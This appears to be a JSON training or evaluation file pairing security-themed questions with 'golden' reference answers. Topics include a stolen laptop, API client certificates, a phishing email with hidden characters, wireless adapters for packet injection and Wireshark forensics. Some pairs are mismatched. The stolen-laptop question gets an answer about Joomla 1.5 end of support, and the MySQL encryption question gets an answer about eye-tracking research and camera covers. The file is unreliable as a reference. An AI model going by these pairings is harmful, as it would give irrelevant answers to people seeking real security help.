        "prompt": "\n\nHuman: <p>My laptop (modded 2007 Macbook Pro) was stolen 2 days ago when I didn't pay attention to my backpack in a tourist spot in Europe and while I'm quite certain they won't have much use for it (the apple is orange :) I'd still like to make sure I'm thinking of everything. What are the next steps, what can I ignore? This is the situation:</p>\n\n<ul>\n<li>OS X 10.8, no HDD encryption, no anti-theft measures (Prey etc)</li>\n<li>Accounts: Admin + separate, limited User account with complex passwords, Account names are not pre-filled</li>\n<li>CVs etc with lots of private data, also outside of User folder on 2nd HDD</li>\n<li>Bank Account, FTP, Mail passwords encrypted in KeePass, nowhere as plain text, none connected to birthdays or other (guessable) personal data</li>\n<li>No passwords saved in browsers</li>\n<li>Lots of e-mails with sensitive and other data, contact book etc in User folder (how easy is it to access those?) as well as my .ssh directory</li>\n<li>Just realized: locally stored websites with config files that contain passwords to my server &amp; DB in plain text (!)</li>\n</ul>\n\n<p>Am I thinking in the right direction? Should I change all my passwords? Any guess of the likelihood that a (crappy looking) tourist laptop will warrant any attention or does this not matter at all, because I should just assume worst case anyways?</p>\n\n<p>Thanks a lot in advance!</p>\n\n\nAssistant:",
        "golden_answer": " <p>Support for Joomla 1.5 LTS <a href=\"https://en.wikipedia.org/wiki/Joomla\" rel=\"nofollow\">ended in Dec 2012</a>. This usually means that no more security patches (or any other maintenance patches) will be released. </p>\n\n<p>The \"solution\" is to migrate content from a known good backup to a supported Joomla version, or some other current Content Management System.</p>\n\n<p>Even if someone here were able to figure out a fix, you would have to migrate anyway, because Joomla 1.5 is out of support - so you might as well do it now.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I want to secure an API used by a react native app. If an authorisation header is sent, the user can read the request and access data. To avoid this I want to use  SSL client certificates.</p>\n\n<p>Now if I place the certificate in the assets folder, will it be possible for the user to get it from the APK? If yes, how can it be avoided?</p>\n\n<p>Is there any other way to secure the request?</p>\n\n\nAssistant:",
        "golden_answer": " <p>You cannot realistically hide the data stored on the device from the device owner. Both jailbreaking and offline analysis of a device can reveal it, as well as simple glitches in your app.</p>\n\n<p>So you are better off using an established security protocol, like oauth2.  Together with a principle of only downloading or storing data the user owns, and accepting that they manipulate it, you have reasonable security.  If data must be kept secret from the user, it must be stored on the server. </p>\n\n<p>Mutual TLS with the app's private key generated during installation, can also give you a reasonable expectation that the device connecting to your server is always the same. In practice, a strong device linking.  No other apps will be able to present the same device certificate.  But expect the owner to be able to read its private key.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>i recently received the following (rather obvious) phishing email: </p>\n\n<p><a href=\"https://i.stack.imgur.com/cgbXr.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/cgbXr.png\" alt=\"enter image description here\"></a></p>\n\n<p>i'm not a PayPal user so this particularly un-alarming for me. however, when viewing as plain text, it became evident that there were hidden characters between every displayed letter of each word, as so:</p>\n\n<blockquote>\n  <p>------------------------------ ------------------------------ ---------- Statement your account has been updated successfully on 12:30:14 pm Friday, December 22, 2017 </p>\n  \n  <hr>\n  \n  <p>HzeglelMo,</p>\n  \n  <p>YmocuTr aMcacdoduvnbt cfhoannlgze1s sHuzcocXeysVsmfEudlIlKy\n  cwh9a2nOgVead.</p>\n  \n  <p>TFhFe dHePt2aNi2lGs oZf thhte cThzaAnAgJe3s abr9e iIn aztbteaVcshsegd\n  DLorwCnIlFo6ald aYn0d rgeuaid tchGe altjtFaScMhJepd YZobu w3inlWl\n  fOiAnFd m5edsDs0aHgJe iQn A2dToebee RgefaEdAenr (kPyDKFV)\n  AfwoHr1mraMtn.</p>\n  \n  <p>TuhsaunxkWs fjorr jXori1neienRg t6hKe mkimlAlci4oKn6s off pkeiospslLe\n  w8h8o rIeGlDy oSn uNs tho mpatkEe s4e2csu3rie fFiqnNaXnsccikaEl\n  thrtaEnOsia2cFt6iWocn2s a7rUoPuTned tLh1e wIoxr5lnd0.</p>\n  \n  <p>SIiTnocAefrSeVlWyd,W</p>\n  \n  <p>PVacy6Pka1l1bidttS0u4pjp0oErCtE.k</p>\n  \n  <p>HbeUlrp r|xddl8vSme5cKu6rQi8tcyoslnnfCte8nrtDrDe</p>\n  \n  <p>PcavyqPzaDlkix8tt(yEGuIrRodp9eP) S.à ri.jlH.IeSt C3i2ee, Sb.rC8.EAp.M\n  SyobcHiété eOn CqoGmImwaBnmdhiYtfe plaAr AacNtkiIonXs.\n  RoeSgPirsNtpe6rreWd oefGfJi1cteD: 212w-t2P4 BloJuJl5ejvBaYrmd\n  R6oGykahl, Ls-c2S4r4r9 Lzulx1etmbb7u9rkg1. RKCHS LmuFxweCmUbyuLrmg BE\n  161t8 3V419a.</p>\n</blockquote>\n\n<p>what could this be for? has anyone ever seen this?</p>\n\n<p><strong>UPDATE</strong> - here are the From + Subject headings</p>\n\n<blockquote>\n  <p>From: service@intl.paypal.com .\n  </p>\n  \n  <p>Sent: Sunday, December 24, 2017 9:39 PM</p>\n  \n  <p>Subject: Case ID Number PP-M-LL0PUG4V : Statement your account has\n  been updated successfully on 12:30:14 pm Friday, December 22, 2017</p>\n</blockquote>\n\n\nAssistant:",
        "golden_answer": " <p>This is just regular malware spam.</p>\n\n<p>The evil part of this message is likely the attached PDF it mentions. It likely contains an exploit which targets a vulnerability in one or more PDF readers and does <em>something bad</em> if opened with a vulnerable program. So do not open the attachment.</p>\n\n<p>The reason for the gibberish text in the email's sourcecode is likely to confuse spam filters so they don't filter it.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I would like to begin testing and working with BackTrack.  I have heard that the <a href=\"http://www.alfa.com.tw/in/front/bin/ptdetail.phtml?Part=AWUS036H&amp;Category=105479\" rel=\"nofollow\">Alfa AWUS036H</a> wireless adapter works well with BackTrack and allows for packet injection.  This adapter, however, is only a wireless b/g adapter.  I was curious if there was something similar to this adapter that would allow for packet injection, work on Windows and Linux (especially BackTrack), and would support wireless b/g/n?  Support for wireless a would be a plus too, but not a requirement.  Also, are there any replacement antenna's that one should consider using with this device?</p>\n\n\nAssistant:",
        "golden_answer": " <p>The first place to look would be the BackTrack wiki: <a href=\"http://www.backtrack-linux.org/wiki/index.php/Wireless_Drivers\" rel=\"nofollow\">http://www.backtrack-linux.org/wiki/index.php/Wireless_Drivers</a></p>\n\n<p>There is also a strong community who will provide guidance on the Backtrack forums.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Is there an example in terms of forensics where Wireshark may be the only method to extract the data for in your .pcap file?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>NetworkMiner is a great tool for automatic extraction of files from a packet capture. It's also surprisingly useful and good at extracting messages such as emails. What it isn't any good for is manual packet analysis, which is where Wireshark shines.</p>\n</blockquote>\n\n<p>See <a href=\"https://www.reddit.com/r/computerforensics/comments/33owp3/how_is_network_miner_different_from_wireshark/\" rel=\"nofollow\">here.</a></p>\n\n<p>Within that link, it's a short post from reddit with someone who asked a similar question. I feel that was the best answer on there for you, and I have some personal knowledge to include.</p>\n\n<p>Wireshark is a very good tool to analyse packets between your network and a specified network that you're monitoring. It's especially powerful if you know how to identify <a href=\"https://en.wikipedia.org/wiki/Lists_of_network_protocols\" rel=\"nofollow\">network protocols</a> such as TCP, DNS, SFTP etc. It's filtering system is also <strong>very useful</strong>, and as stated in the above quote, NetworkMiner is especially good for message extraction and I also believe it is good for MITM network monitoring.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>To give a quick background, we need to implement a solution where we can guarantee that information is stored encrypted. Access to the encryption data will only be possible through an application that has dedicated access to the database. With every \"request\" to this application, authentication details will be provided that is then used to create a log of who has read what information and when.</p>\n\n<p>My main requirements are:</p>\n\n<ul>\n<li>MySQL 5.5</li>\n<li>Database will be replicated for backup purposes. One should be able to restore from such replicated database, but by accessing a replicated database I should not be able to read any information.</li>\n</ul>\n\n<p>My idea is to use application-level encryption and store explicit encrypted values in the database. That is, on a technical level, the database has no way of knowing that information is encrypted. The actual \"structure\" of the database (tables, columns etc) isn't something we consider secret. To implement the application-level encryption I'm thinking of applying AES_ENCRYPT/AES_DECRYPT that is built-in MySQL, using a passphrase that is only known by the application.</p>\n\n<p>Does anyone see a problem with this approach? Surely, the passphrase must be kept secret. If the passphrase would leak, I thinking that it would be trivial to re-encrypt all values with a new passphrase. The database isn't expected to be large, performance requirements are low. Development and testing environments would be easy to have, as the only difference would be the passphrase used.</p>\n\n\nAssistant:",
        "golden_answer": " <p><a href=\"http://people.csail.mit.edu/khosla/papers/cvpr2016_Khosla.pdf\" rel=\"noreferrer\">Eye Tracking for Everyone. 2176-2184. 10.1109/CVPR.2016.239. (2016) - Krafka, Khosla, Kellnhofer et al</a></p>\n\n<blockquote>\n  <p>Our model achieves a prediction error of 1.71cm and\n  2.53cm  without  calibration  on  mobile  phones  and  tablets\n  respectively. With calibration, this is reduced to 1.34cm and\n  2.12cm.</p>\n</blockquote>\n\n<p>So yes - it is possible. This particular study was performed using iOS and achieved a read rate at 10–15fps. </p>\n\n<p>There are several companies selling products with similar technology - <a href=\"http://www.umoove.me/\" rel=\"noreferrer\">UMoove</a> for example. It would not surprise me if a higher precision than in the mentioned paper could be achieved.</p>\n\n<p>If you are paticularly concerned a number of smartphone camera covers are available - <a href=\"https://www.amazon.co.uk/Webcam-Cover-0-7mm-THIN-Smartphone/dp/B075LLQW16\" rel=\"noreferrer\">here is one example</a>.</p>\n"
    }
]